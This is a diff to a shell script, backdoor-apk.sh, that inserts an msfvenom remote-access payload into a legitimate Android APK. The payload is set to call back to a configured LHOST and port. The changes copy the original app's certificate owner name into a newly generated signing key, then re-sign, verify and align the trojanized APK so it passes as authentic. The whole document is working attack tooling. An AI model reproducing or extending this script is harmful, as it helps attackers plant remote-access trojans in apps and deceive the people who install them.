@@ -14,14 +14,18 @@
 # usage: ./backdoor-apk.sh original.apk
 
 # modify the following values as necessary
-
 MSFVENOM=msfvenom
 LHOST="10.6.9.31"
 LPORT="1337"
 DEX2JAR=d2j-dex2jar
+UNZIP=unzip
+KEYTOOL=keytool
+JARSIGNER=jarsigner
 APKTOOL=third-party/apktool/apktool
 PROGUARD=third-party/proguard5.2.1/lib/proguard
 DX=third-party/android-sdk-linux/build-tools/23.0.3/dx
+ZIPALIGN=third-party/android-sdk-linux/build-tools/23.0.3/zipalign
+# file paths
 MY_PATH=`pwd`
 ORIG_APK_FILE=$1
 RAT_APK_FILE=Rat.apk
@@ -212,16 +216,51 @@ if [ $rc != 0 ]; then
   exit $rc;
 fi
 
-keystore=$MY_PATH/debug.keystore
-compiled_apks=$MY_PATH/original/dist/*.apk
+keystore=$MY_PATH/signing.keystore
+compiled_apk=$MY_PATH/original/dist/$ORIG_APK_FILE
+unaligned_apk=$MY_PATH/original/dist/unaligned.apk
 
-echo -n "[*] Signing recompiled APK..."
-jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore $keystore -storepass android -keypass android $compiled_apks debug.key >>$LOG_FILE 2>&1
+dname=`$UNZIP -p $ORIG_APK_FILE META-INF/CERT.RSA |$KEYTOOL -printcert |grep "Owner:" |sed 's/Owner: //g'`
+echo "dname value: $dname" >>$LOG_FILE 2>&1
+
+echo -n "[*] Generating RSA key for signing...";
+$KEYTOOL -genkey -v -noprompt -alias signing.key -dname "$dname" -keystore $keystore -storepass android -keypass android -keyalg RSA -keysize 2048 -validity 10000 >>$LOG_FILE 2>&1
 rc=$?
-echo "done."
+echo "done.";
+if [ $rc != 0 ]; then
+  echo "[!] Failed to generate RSA key";
+  exit $rc;
+fi
+
+echo -n "[*] Signing recompiled APK...";
+$JARSIGNER -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore $keystore -storepass android -keypass android $compiled_apk signing.key >>$LOG_FILE 2>&1
+rc=$?
+echo "done.";
 if [ $rc != 0 ]; then
   echo "[!] Failed to sign recompiled APK";
   exit $rc;
 fi
+
+echo -n "[*] Verifying signed artifacts...";
+$JARSIGNER -verify -verbose -certs $compiled_apk >>$LOG_FILE 2>&1
+rc=$?
+echo "done.";
+if [ $rc != 0 ]; then
+  echo "[!] Failed to verify signed artifacts";
+  exit $rc;
+fi
+
+mv $compiled_apk $unaligned_apk
+
+echo -n "[*] Aligning recompiled APK...";
+$ZIPALIGN -v 4 $unaligned_apk $compiled_apk >>$LOG_FILE 2>&1
+rc=$?
+echo "done.";
+if [ $rc != 0 ]; then
+  echo "[!] Failed to align recompiled APK";
+  exit $rc;
+fi
+
+rm $unaligned_apk
 
 exit 0
